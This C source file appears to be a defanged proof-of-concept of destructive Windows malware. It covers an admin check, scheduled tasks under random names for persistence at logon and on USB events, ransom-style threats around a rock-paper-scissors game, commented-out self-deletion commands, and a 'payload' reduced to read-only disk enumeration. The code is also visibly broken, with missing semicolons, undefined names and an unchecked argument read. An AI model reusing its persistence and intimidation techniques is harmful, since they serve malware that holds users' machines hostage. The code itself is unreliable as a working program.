#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <winioctl.h> 
#include <ntdddisk.h>
#include <stdbool.h>
#include <winevt.h>

#pragma comment(lib, "wevtapi.lib")


// note*
// this is a sanatized version of a poc destructive script
// its safe, but I would still recommend running in a vm
// because of "<ntdddisk.h>" it requires MSVSC

// only run if user is admin
bool admin_check() {
    BOOL is_admin = FALSE;
    PSID admin_group = NULL;

    // admin group sid is "S-1-5-32-544"
    if (ConvertStringSidToSidA("S-1-5-32-544", &admin_group)) {
        if (!CheckTokenMembership(NULL, admin_group, &is_admin)) {
            is_admin = FALSE;
        }
        LocalFree(admin_group); // free mem from ConvertStringSidToSidA
    }

    if (!is_admin) {
        printf("your not an admin!!")
        /*char cmd[MAX_PATH + 64];
        GetModuleFileNameA(NULL, cmd, MAX_PATH);
        char rm_cmd[MAX_PATH + 128];
        sprintf(rm_cmd,
        "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
        system(rm_cmd);
        return 1;*/
    }
    return is_admin;
}
char rand_nm[7]; // global var, + null term
const char charset[] = "abcdefghijklmnopqrstuvwxyzaBCDEFGHIJKLMNOPQRSTUVWXYZ123456789";

void gen_rnd() {
    size_t len = sizeof(charset) -1; // for null term
    for (int a = 0; a < 6; a++) {
        rand_nm[a] = charset[rand() % len];
    }
    rand_nm[6] = '\0'; // null term
}


void task_sch_logon() {
    char exepath[MAX_PATH]; //finding current executable
    char cmd[MAX_PATH + 256]; // buffer for the rest of the code

    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
        return;
    }

    printf("%s task created :)", rand_nm);
    sprintf(cmd, 
        "schtasks /create /sc onlogon /tn \"%s\" /tr \"%s payload\" /rl highest /f", 
        rand_nm, exepath);
    system(cmd);
    
}

BOOL past_usb_check(){
    EVT_HANDLE hQuery = EvtQuery(
        NULL,
        L"Microsoft-Windows-DriverFrameworks-UserMode/Operational",
        L"*[System[(EventID=2003)]]",
        EvtQueryReverseDirection
    );

    if (!hQuery) return FALSE;

    EVT_HANDLE hEvent;
    DWORD returned;
    BOOL found = FALSE;

    if (EvtNext(hQuery, 1, &hEvent, 0, 0, &returned)) {
        found = TRUE; 
        EvtClose(hEvent);
    }

    EvtClose(hQuery);
    return found;
}

ULONGLONG used_space_drive(const wchar_t* drive) {
    ULARGE_INTEGER free_bytes, total_bytes, total_free;
    if (GetDiskFreeSpaceExW(drive, &free_bytes, &total_bytes, &total_free)) {
        return total_bytes.QuadPart - free_bytes.QuadPart; // get used bytes
    }
    return 0;
}

DWORD drive_mask; //global
ULONGLONG threshold = 4ULL * 1024 * 1024 * 1024;

void check_new_usb() {
    drive_mask = GetLogicalDrives(); // gets bitmask of all drives
    printf("i see you have a new usb")
    check_usb_threshold(threshold);
    printf("its above the threshold!!!")
}

void task_sch_usb() {
    if (!past_usb_check()) {
        return;
    }
    char exepath[MAX_PATH];
    char cmd[MAX_PATH + 512];
    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) return;

    sprintf(cmd,
        "schtasks /create /tn \"%s\" /tr \"%s usb_check\" /sc ONEVENT "
        "/ec System /mo \"*[System[Provider[@Name='Kernel-PnP'] and EventID=200]]\" "
        "/rl highest /f",
        rand_nm, exepath);
    system(cmd);
    printf("%s task created", rand_nm)
    
}
void check_usb_threshold(ULONGLONG threshold) {
    for (int b = 0; b < 26; b++) {
            if (drive_mask & (1 << b)) {
                wchar_t drive[4] = {L'A' + b, L':', L'\\', L'\0'};
                ULONGLONG used = used_space_drive(drive);
            if (used >= threshold) {
                safe_payload();
                break;
            }
        }
    }
}
// so if you win your system isnt destroyed
void safe() {
    // rm scheduled tsk
    char cmd[MAX_PATH + 256];
    sprintf(cmd, "schtasks /delete /tn \"%s\" /f", rand_nm);
    system(cmd);
    
    //delete itself
    //uses localhost as a delay method 
    /*char cmd[MAX_PATH + 64];
    GetModuleFileNameA(NULL, cmd, MAX_PATH);
    char rm_cmd[MAX_PATH + 128];
    sprintf(rm_cmd, "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
    system(rm_cmd);*/

}
void game() {
    SetConsoleTitleA("Screen");

    printf("=== Let's Play a little Game ===\n");
    printf("If you want your computer back...\n");
    printf("I wouldn't exit this program if I were you");

    srand(time(NULL));
	const char *dict[] = {"", "rock", "paper", "scissors"};
	int robot = rand() % 3 + 1;
	int play;
    char input[16];

	while (1){
        printf("rock(1), paper(2), scissors(3) >:");
        if (!fgets(input, sizeof(input), stdin)) 
            continue;

        if (sscanf(input, "%d", &play) !=1 || play<1 || play>3){ // from Tyler, input handling
            printf("1, 2 or 3!!!\n invalid input ");
            continue;
        }
        break; // valid input 
    }

	int rps = play - robot;
	printf("robot chose %s\n", dict[robot]);
	if ((rps > 0 && rps != -2) || rps == -2) {
        printf("you won!\n");
        safe();
    } else if (rps == -1 || rps == 0) {
        printf("you lost :(\n");
    }
}


void disk_attrs(const Disk_info * attrs) {
    printf("    Read only: %u\n", (unsigned)attrs->ReadOnly);
    printf("    Offline:  %u\n", (unsigned)attrs->Offline);
    printf("    No Default Drive Letter: %u\n", (unsigned)attrs->NoDefaultDriveLetter);
    printf("    Hidden: %u\n", (unsigned)attrs->Hidden);
    printf("    require Shared Clones: %u\n", (unsigned)attrs->RequireSharedClones);
}

void safe_payload() {
    // only accepts 32 disks
    for (int disknum = 0; disknum < 32; disknum++) {
        char disk_path[64];
        sprintf(disk_path, "\\\\.\\PhysicalDrive%d", disknum);
        
        // open read only
        HANDLE hDisk = CreateFileA(
            disk_path,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );

        if (hDisk == INVALID_HANDLE_VALUE) {
            continue;
        }
        printf("*** %s ***", disk_path);

        // get disk attrs 
        DISK_ATTRIBUTES attrs = {0};
        DWORD bytes_returned = 0;
        BOOL ok = DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_DISK_ATTRIBUTES,
            NULL, 0,
            &attrs, sizeof(attrs),
            &bytesReturned,
            NULL
        );

        if (ok) {
            printDiskAttributes(&attrs);
        } else {
            printf("  IOCTL_DISK_GET_DISK_ATTRIBUTES failed (err=%u)\n", GetLastError());
        }
        
        // get disk lenght
        GET_LENGTH_INFORMATION lengthInfo = {0};
        ok = DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_LENGTH_INFO,
            NULL, 0,
            &lengthInfo, sizeof(lengthInfo),
            &bytesReturned,
            NULL
        );
        
        if (ok) {
            unsigned long long bytes = (unsigned long long)lengthInfo.Length.QuadPart;
            // human-readable size
            if (bytes < 1024ULL) {
                printf("  Size: %llu B\n", bytes);
            } else if (bytes < 1024ULL * 1024ULL) {
                printf("  Size: %.2f KB\n", bytes / 1024.0);
            } else if (bytes < 1024ULL * 1024ULL * 1024ULL) {
                printf("  Size: %.2f MB\n", bytes / (1024.0 * 1024.0));
            } else {
                printf("  Size: %.2f GB\n", bytes / (1024.0 * 1024.0 * 1024.0));
            }
        } else {
            printf("  IOCTL_DISK_GET_LENGTH_INFO failed (err=%u)\n", GetLastError());
        }
    }
}
int main(int argc, char *argv[]){
    // so that on logon, the script only runs the payload
    // i added flagging in the first place because i want the user to
    //enter uac once at the start instead of after they lose
    if (argc > 1 && strcmp(argv[1], "payload") == 0) {
        safe_payload();
        return 0;
    } else if (strcmp(argv[1], "usb_check") == 0) {
        check_new_usb();
        return 0;
    }
    admin_check();
    srand(time(NULL));
    gen_rnd();
    task_sch_logon();
    task_sch_usb();
    game();
}